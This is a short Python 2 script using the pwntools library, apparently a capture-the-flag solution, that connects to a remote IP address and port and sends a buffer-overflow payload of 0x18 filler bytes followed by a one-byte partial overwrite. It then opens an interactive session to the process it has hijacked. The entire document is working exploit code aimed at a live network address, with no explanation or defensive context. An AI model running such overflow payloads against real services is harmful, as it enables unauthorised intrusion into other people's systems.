#!/usr/bin/env python2

from pwn import *

p = remote('203.66.68.57', 54321)

p.send('a'*0x18+'\xb2')
p.interactive()
